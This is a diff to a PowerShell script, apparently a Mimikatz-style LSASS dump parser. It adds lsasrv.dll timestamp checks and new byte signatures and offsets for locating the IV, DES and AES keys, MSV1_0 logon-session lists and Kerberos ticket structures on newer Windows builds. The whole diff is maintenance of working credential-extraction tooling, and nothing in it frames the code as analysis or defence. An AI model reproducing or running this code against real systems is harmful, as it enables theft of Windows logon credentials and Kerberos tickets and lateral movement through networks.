@@ -1034,9 +1034,10 @@ $Start = Get-Date
         {
         Param(
             [int]$OSVersion,
-            $ProcessorArchitecture
+            $ProcessorArchitecture,
+            $LSATimestamp
         )
-    
+        
         $WIN_XP  = 2600
         $WIN_2K3 = 3790
         $WIN_VISTA = 6000
@@ -1051,7 +1052,7 @@ $Start = Get-Date
         $WIN_10_1803 = 17134
         $WIN_10_1809 = 17763
         $WIN_10_1903 = 18362
-    
+        
         $Crypto = New-Object -Type psobject -Property (@{
             "Pattern" = $null
             "IV-Offset" = $null
@@ -1060,7 +1061,7 @@ $Start = Get-Date
             "key-handle" = $null
             "key-struct" = $null
             })
-    
+        
         if(($OSVersion -le $WIN_XP) -or ($OSVersion -lt $WIN_2K3))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
@@ -1110,8 +1111,7 @@ $Start = Get-Date
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
-                $Crypto = New-Object -Type psobject -Property (@{
-                                 
+                $Crypto = New-Object -Type psobject -Property (@{         
                     "Pattern" = "8364243000448B4C2448488B0D"
                     "IV-Offset" = 59
                     "DES-Offset" = -61
@@ -1124,14 +1124,31 @@ $Start = Get-Date
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Crypto template identfied and selected")
-                $Crypto = New-Object -Type psobject -Property (@{
-                    "Pattern" = "8364243000448B4DD8488B0D"
-                    "IV-Offset" = 62
-                    "DES-Offset" = -70
-                    "AES-Offset" = 23
-                    "key-handle" = "Get-BCRYPT_HANDLE_KEY"
-                    "key-struct" = "Get-BCRYPT_KEY8"
-                    })
+                
+                if($LSATimestamp -gt "1610612736")
+                    {
+                        #new
+                        $Crypto = New-Object -Type psobject -Property (@{
+                            "Pattern" = "8364243000448B4DD8488B0D"
+                            "IV-Offset" = 58
+                            "DES-Offset" = -62
+                            "AES-Offset" = 23
+                            "key-handle" = "Get-BCRYPT_HANDLE_KEY"
+                            "key-struct" = "Get-BCRYPT_KEY8"
+                            })
+                    }
+                else 
+                    {
+                        $Crypto = New-Object -Type psobject -Property (@{
+                            "Pattern" = "8364243000448B4DD8488B0D"
+                            "IV-Offset" = 62
+                            "DES-Offset" = -70
+                            "AES-Offset" = 23
+                            "key-handle" = "Get-BCRYPT_HANDLE_KEY"
+                            "key-struct" = "Get-BCRYPT_KEY8"
+                            })               
+                    }
+                
             }
         #Value need to be tested - if there is a version number before WIN10 but not Windows Blue
         elseif(($OSVersion -le $WIN_BLUE) -or ($OSVersion -lt $WIN_10_1507))
@@ -1225,7 +1242,7 @@ $Start = Get-Date
                     "key-handle" = "Get-BCRYPT_HANDLE_KEY"
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
-    
+        
             }
         elseif($OSVersion -lt $WIN_10_1809)
             {
@@ -1252,7 +1269,7 @@ $Start = Get-Date
                     "key-handle" = "Get-BCRYPT_HANDLE_KEY"
                     "key-struct" = "Get-BCRYPT_KEY81"
                     })
-    
+        
             }
         return $Crypto
         }
@@ -1265,7 +1282,7 @@ $Start = Get-Date
             $OSArch,
             $LSATimestamp
         )
-    
+        
         $WIN_XP  = 2600
         $WIN_2K3 = 3790
         $WIN_VISTA = 6000
@@ -1284,8 +1301,8 @@ $Start = Get-Date
         $Pattern = $null
         $offset_to_FirstEntry = $null
         $offset_to_SessionCounter = $null
-    
-    
+        
+        
         if(($OSVersion -le $WIN_XP) -or ($OSVersion -lt $WIN_2K3))
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
@@ -1320,8 +1337,8 @@ $Start = Get-Date
                 $kerberos_offset = 6
                 $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION"
                 $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_6"
-
-
+        
+        
             }
         elseif(($OSVersion -le $WIN_8) -or ($OSVersion -lt $WIN_BLUE))
             {
@@ -1330,14 +1347,30 @@ $Start = Get-Date
                 $Pattern = "33FF4189374C8BF34585C074"
                 $offset_to_FirstEntry = 16
                 $offset_to_SessionCounter = -4
-                if($LSATimestamp -gt "1397227520")
+        
+                #+ Added new Windows Server 2012 adjustment
+                if($LSATimestamp -gt "1610612736")
                     {
-                    $ParsingFunction = "Get-MSV1_0_LIST_63"
+                        $Pattern = "8BDE488D0C5B48C1E105488D05"
+                        $offset_to_FirstEntry = 34
+                        $offset_to_SessionCounter = -6
+                        $ParsingFunction = "Get-MSV1_0_LIST_63"
                     }
                 else 
                     {
-                    $ParsingFunction = "Get-MSV1_0_LIST_62"
+                        $Pattern = "33FF4189374C8BF34585C074"
+                        $offset_to_FirstEntry = 16
+                        $offset_to_SessionCounter = -4
+                        if($LSATimestamp -gt "1397227520")
+                            {
+                            $ParsingFunction = "Get-MSV1_0_LIST_63"
+                            }
+                        else 
+                            {
+                            $ParsingFunction = "Get-MSV1_0_LIST_62"
+                            }
                     }
+        
                 $CredParsingFunction = "Parse-PrimaryCredential" 
                 $kerberossignature = "488B18488D0D"
                 $kerberos_offset = 6
@@ -1484,7 +1517,7 @@ $Start = Get-Date
             $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
             $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_10_1607"
             }
-    
+        
         $MSVTemp = New-Object -Type psobject -Property (@{
             Pattern = $Pattern
             FstEntry = $offset_to_FirstEntry
@@ -1497,8 +1530,9 @@ $Start = Get-Date
             kerberos_ticket_struct = $kerberos_ticket_struct 
             })
         return $MSVTemp
-    
+        
         }
+        
     
     function Get-BCRYPT_HANDLE_KEY 
     {
@@ -1761,7 +1795,7 @@ $Start = Get-Date
             $Dump
         )
     
-        $CryptoTemplate = Select-CryptoTemplate -OSVersion ([convert]::toint64($Dump.SystemInfoStream.BuildNumber,16)) -OSArch $Dump.SystemInfoStream.ProcessorArchitecture
+        $CryptoTemplate = Select-CryptoTemplate -OSVersion ([convert]::toint64($Dump.SystemInfoStream.BuildNumber,16)) -OSArch $Dump.SystemInfoStream.ProcessorArchitecture -LSATimestamp ([convert]::toint64(($Dump.ModuleListStream | where {$_.ModuleName -like "*lsasrv.dll*"}).TimeDateStamp,16))
         $PatternAddress = Find-PatternInModule -ModuleName "lsasrv.dll" -Pattern  $CryptoTemplate.Pattern -Dump $Dump
         
         if ($PatternAddress -eq $Null) {
